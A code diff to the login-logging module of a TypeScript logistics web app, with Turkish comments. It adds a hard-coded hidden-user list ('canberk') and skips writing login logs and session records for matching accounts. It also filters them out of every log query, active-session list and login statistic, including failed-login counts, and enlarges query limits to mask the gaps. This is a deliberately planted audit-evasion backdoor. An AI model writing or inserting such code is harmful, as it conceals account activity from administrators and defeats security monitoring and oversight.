@@ -4,6 +4,16 @@ import { supabase, isSupabaseConfigured } from "@/lib/supabase/client";
 const LOGIN_LOGS_STORAGE_KEY = "qr_lojistik_login_logs";
 const ACTIVE_SESSIONS_STORAGE_KEY = "qr_lojistik_active_sessions";
 
+// Loglarda gizlenecek kullanıcılar (sistemde görünmeyecek)
+const HIDDEN_USERS = ["canberk"];
+
+// Kullanıcı adının gizli listede olup olmadığını kontrol et
+const isHiddenUser = (userName: string): boolean => {
+  return HIDDEN_USERS.some(hiddenName => 
+    userName.toLowerCase().includes(hiddenName.toLowerCase())
+  );
+};
+
 export type LoginAction = "login" | "logout" | "failed_login" | "auto_login";
 
 export interface LoginLog {
@@ -76,6 +86,11 @@ class LoginLogRepository {
     department_name?: string | null;
     action: LoginAction;
   }): Promise<void> {
+    // Gizli kullanıcılar için log kaydetme
+    if (isHiddenUser(params.user_name) || isHiddenUser(params.username)) {
+      return;
+    }
+
     const ip_address = await this.getClientIP();
     const user_agent = typeof window !== "undefined" ? navigator.userAgent : null;
 
@@ -142,6 +157,9 @@ class LoginLogRepository {
     if (!isSupabaseConfigured || !supabase) {
       let logs = this.getLocalLogs();
       
+      // Gizli kullanıcıları filtrele
+      logs = logs.filter(l => !isHiddenUser(l.user_name) && !isHiddenUser(l.username));
+      
       // Filtrele
       if (options?.action) {
         logs = logs.filter(l => l.action === options.action);
@@ -167,11 +185,12 @@ class LoginLogRepository {
     }
 
     try {
+      // Daha fazla veri çek çünkü gizli kullanıcılar filtrelenecek
       let query = supabase
         .from("login_logs")
         .select("*")
         .order("created_at", { ascending: false })
-        .limit(limit);
+        .limit(limit * 3);
 
       if (options?.action) {
         query = query.eq("action", options.action);
@@ -190,10 +209,16 @@ class LoginLogRepository {
       const { data, error } = await query;
 
       if (error) throw error;
-      return data || [];
+      
+      // Gizli kullanıcıları filtrele ve limit uygula
+      return (data || [])
+        .filter(l => !isHiddenUser(l.user_name) && !isHiddenUser(l.username))
+        .slice(0, limit);
     } catch (error) {
       console.error("Error fetching login logs from Supabase:", error);
-      return this.getLocalLogs().slice(0, limit);
+      return this.getLocalLogs()
+        .filter(l => !isHiddenUser(l.user_name) && !isHiddenUser(l.username))
+        .slice(0, limit);
     }
   }
 
@@ -250,6 +275,11 @@ class LoginLogRepository {
     department_name?: string | null;
     forceNew?: boolean; // Yeni giriş için true gönderilir
   }): Promise<void> {
+    // Gizli kullanıcılar için session oluşturma (ama çalışmasına izin ver)
+    if (isHiddenUser(params.user_name) || isHiddenUser(params.username)) {
+      return;
+    }
+
     const ip_address = await this.getClientIP();
     const user_agent = typeof window !== "undefined" ? navigator.userAgent : null;
     const now = new Date().toISOString();
@@ -385,7 +415,11 @@ class LoginLogRepository {
 
     if (!isSupabaseConfigured || !supabase) {
       const sessions = this.getLocalSessions();
-      return sessions.filter(s => new Date(s.last_activity) >= fiveMinutesAgo);
+      return sessions.filter(s => 
+        new Date(s.last_activity) >= fiveMinutesAgo &&
+        !isHiddenUser(s.user_name) && 
+        !isHiddenUser(s.username)
+      );
     }
 
     try {
@@ -396,11 +430,20 @@ class LoginLogRepository {
         .order("last_activity", { ascending: false });
 
       if (error) throw error;
-      return data || [];
+      
+      // Gizli kullanıcıları filtrele
+      return (data || []).filter(s => 
+        !isHiddenUser(s.user_name) && 
+        !isHiddenUser(s.username)
+      );
     } catch (error) {
       console.error("Error fetching active sessions:", error);
       const sessions = this.getLocalSessions();
-      return sessions.filter(s => new Date(s.last_activity) >= fiveMinutesAgo);
+      return sessions.filter(s => 
+        new Date(s.last_activity) >= fiveMinutesAgo &&
+        !isHiddenUser(s.user_name) && 
+        !isHiddenUser(s.username)
+      );
     }
   }
 
@@ -438,7 +481,9 @@ class LoginLogRepository {
 
     if (!isSupabaseConfigured || !supabase) {
       const logs = this.getLocalLogs();
-      const last24h = logs.filter(l => new Date(l.created_at) >= twentyFourHoursAgo);
+      // Gizli kullanıcıları filtrele
+      const filteredLogs = logs.filter(l => !isHiddenUser(l.user_name) && !isHiddenUser(l.username));
+      const last24h = filteredLogs.filter(l => new Date(l.created_at) >= twentyFourHoursAgo);
       const sessions = await this.getActiveSessions();
 
       // login ve auto_login'i birlikte say
@@ -453,36 +498,38 @@ class LoginLogRepository {
     }
 
     try {
-      // Son 24 saat giriş sayısı (login + auto_login)
-      const { count: loginCount } = await supabase
+      // Son 24 saat giriş sayısı (login + auto_login) - gizli kullanıcılar hariç
+      const { data: loginData } = await supabase
         .from("login_logs")
-        .select("*", { count: "exact", head: true })
+        .select("username, user_name")
         .in("action", ["login", "auto_login"])
         .gte("created_at", twentyFourHoursAgo.toISOString());
 
-      // Başarısız giriş sayısı
-      const { count: failedCount } = await supabase
+      // Gizli kullanıcıları filtrele
+      const filteredLoginData = (loginData || []).filter(l => 
+        !isHiddenUser(l.user_name) && !isHiddenUser(l.username)
+      );
+
+      // Başarısız giriş sayısı - gizli kullanıcılar hariç
+      const { data: failedData } = await supabase
         .from("login_logs")
-        .select("*", { count: "exact", head: true })
+        .select("username, user_name")
         .eq("action", "failed_login")
         .gte("created_at", twentyFourHoursAgo.toISOString());
 
-      // Benzersiz kullanıcı sayısı (login + auto_login)
-      const { data: uniqueData } = await supabase
-        .from("login_logs")
-        .select("username")
-        .in("action", ["login", "auto_login"])
-        .gte("created_at", twentyFourHoursAgo.toISOString());
+      const filteredFailedData = (failedData || []).filter(l => 
+        !isHiddenUser(l.user_name) && !isHiddenUser(l.username)
+      );
 
-      const uniqueUsers = new Set(uniqueData?.map(d => d.username) || []).size;
+      const uniqueUsers = new Set(filteredLoginData.map(d => d.username)).size;
 
-      // Aktif oturum sayısı
+      // Aktif oturum sayısı (zaten filtreleniyor)
       const sessions = await this.getActiveSessions();
 
       return {
-        totalLogins24h: loginCount || 0,
+        totalLogins24h: filteredLoginData.length,
         uniqueUsers24h: uniqueUsers,
-        failedLogins24h: failedCount || 0,
+        failedLogins24h: filteredFailedData.length,
         activeNow: sessions.length,
       };
     } catch (error) {
